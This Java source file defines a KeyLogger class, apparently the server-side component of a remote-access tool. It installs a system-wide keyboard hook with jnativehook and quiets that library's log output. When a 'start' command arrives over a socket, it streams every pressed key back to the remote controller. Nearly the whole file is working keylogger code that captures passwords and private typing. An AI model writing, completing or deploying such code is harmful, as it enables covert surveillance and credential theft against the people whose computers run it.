package Server;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;

import java.net.Socket;
import java.util.logging.Level;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
/**
 *
 * @author ad
 */
public class KeyLogger extends Thread implements NativeKeyListener {

    private String KEYSTROKE_START = "start";
    private String KEYSTROKE_STOP = "stop";
    private Socket socket = null;
    private boolean isListenning = true;
    DataOutputStream out;
    DataInputStream inp;
    String letter = "";

    public KeyLogger(Socket sc) {
         logger.info("Key logger has been started");
        init();
        this.socket = sc;

        start();

    }

    public void run() {
        try {
            inp = new DataInputStream(socket.getInputStream());
            out = new DataOutputStream(socket.getOutputStream());
        } catch (IOException e) {

        }
       

        
        try {
            GlobalScreen.registerNativeHook();

        } catch (NativeHookException e) {
            logger.error(e.getMessage(), e);
            System.exit(-1);
        }

        GlobalScreen.addNativeKeyListener(this);

        try {

            while (true) {
                
                letter = inp.readUTF();
                System.out.println("Letter:" + letter);
            }
        } catch (IOException e) {
        }
    }
    private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);

    private static void init() {

        // Get the logger for "org.jnativehook" and set the level to warning.
        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);

        // Don't forget to disable the parent handlers.
        logger.setUseParentHandlers(false);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        String keyText = NativeKeyEvent.getKeyText(nke.getKeyCode());
        System.out.println(keyText);
        if (letter.equals(KEYSTROKE_START)) {

                    if (keyText.length() > 1) {
                        keyText = "[" + keyText + "]";

                    }
                
            try {
//                out.writeUTF(keyText);
                  out.writeUTF(keyText);
            } catch (IOException e) {

            }
        } else if (letter.equals(KEYSTROKE_STOP)) {
            
        }

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {

    }

}
